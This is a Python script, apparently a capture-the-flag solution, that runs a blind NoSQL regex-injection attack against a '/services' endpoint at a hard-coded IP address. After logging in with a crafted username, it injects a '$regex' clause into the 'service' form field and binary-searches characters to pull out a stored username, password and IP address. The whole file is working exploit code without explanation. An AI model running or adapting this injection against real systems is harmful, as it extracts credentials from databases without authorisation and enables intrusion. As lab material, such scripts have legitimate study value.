import requests


def checkInterval(sess, minC, maxC, attribute, crackedValue):
    if minC != maxC:
        regex = "^"+crackedValue+"["+minC+"-"+maxC+"].*"
    else:
        regex = "^"+crackedValue+"["+minC+"].*" # Check for one specific character
        
    payload = '", "'+attribute+'":{"$regex":"'+regex+'"}, "Service": "ssh'
    
    resp = sess.post('http://3.141.109.49/services', data={'service': payload})
    if resp.content.find('Service is UP') != -1: # we got a hit
        return True
    else:
        return False


def findCharInRange(sess, minC, maxC, attribute, crackedValue):
    if minC == maxC:
        # Testing on a single character
        maxC = chr(ord(maxC)+1) # This should always give the same middle character, which is the character itself.
        
    while minC != maxC:
        middle = chr((ord(minC) + ord(maxC))/2)

        if checkInterval(sess, minC, middle, attribute, crackedValue):
            maxC = middle
        else:
            minC = chr(ord(middle)+1)
    
    return minC if checkInterval(sess, minC, minC, attribute, crackedValue) else False


def crackAttribute(sess, attribute, ip=False):
    """
        We add an ip variable in order to avoid checking for alphabet characters in an IP, useless.
    """
    value = ''
    while True:
        if ip:
            result = findCharInRange(sess, '0', '9', attribute, value)
            if result:
                value += result
            else:
                result = findCharInRange(sess, '.', '.', attribute, value)
                if result:
                    value += result
                else:
                    break
            
            continue
        
        result = findCharInRange(sess, 'a', 'z', attribute, value)
        if result:
            value += result
        else:
            result = findCharInRange(sess, 'A', 'Z', attribute, value)
            if result:
                value += result
            else:
                break
                
    return value

sess = requests.session()
sess.post('http://3.141.109.49/login', data={'username': '../jutsu/1#'}) # Login

print 'Username: ' + crackAttribute(sess, 'username')
print 'Password: ' + crackAttribute(sess, 'password')
print 'IP: ' + crackAttribute(sess, 'IP', True)

    
